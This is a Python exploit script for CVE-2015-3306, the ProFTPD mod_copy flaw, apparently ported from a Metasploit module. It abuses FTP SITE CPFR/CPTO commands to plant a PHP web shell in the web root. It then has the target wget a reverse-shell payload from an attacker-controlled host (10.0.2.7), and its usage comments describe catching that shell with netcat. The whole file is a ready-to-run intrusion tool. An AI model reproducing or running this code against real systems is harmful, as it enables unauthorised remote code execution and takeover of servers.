#!/usr/bin/env python

# CVE-2015-3306 translated from ruby metasploit module (/proftpd_modcopy_exec.rb) 
# program outline:
	 # - open a socket connection to the target machine
	 # - PHP one liner to open the cmd shell
	 # - FTP site commands to copy a file to a destination on the server, the cmd shell
	 # - GET requests to download and execute the reverse shell
	 # - call the Payload class with appropriate parameters and run the exploit
# usage:  
	 # - start a web server on port 80
	 # - python3 ftp.py --target <vicimIP> --port 21 --path "/var/www/html"
	 # - listen with nc -nlvp 53 on attacker

import sys, os, requests, socket, argparse

class Payload:
    def __init__(self, target, port, path):
        self.__sock = None
        self.__target = target
        self.__port = port
        self.__path = path

    def __socket(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__target, self.__port))
        self.__sock.recv(1024)

    def __payload(self):
        shell = "<?php echo shell_exec($_GET['cmd']); ?>"
        self.__sock.send(b"site cpfr /proc/self/cmdline\n")
        self.__sock.recv(1024)
        self.__sock.send(("site cpto /tmp/." + shell + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpfr /tmp/." + shell + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpto " + self.__path + "/shell.php\n").encode("utf-8"))

        if "Copy successful" in str(self.__sock.recv(1024)):
            print("[+] Exploit successful, fetching shell @ http://" + self.__target + "/run.php")
        else:
            print("[-] Error")

        r = requests.get("http://" + self.__target + "/shell.php?cmd=wget http://10.0.2.7/run.php")
        g = requests.get("http://" + self.__target + "/run.php")

    def exe(self):
        self.__socket()
        self.__payload()

def main(arg):
    print("[+] Targeting " + arg.target + ":" + arg.port + " listen for the shell on port 53")

    payload = Payload(arg.target, int(arg.port), arg.path)
    payload.exe()

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument('--target', required=True)
    p.add_argument('--port', required=True)
    p.add_argument('--path', required=True)
    arg = p.parse_args()

    main(arg)
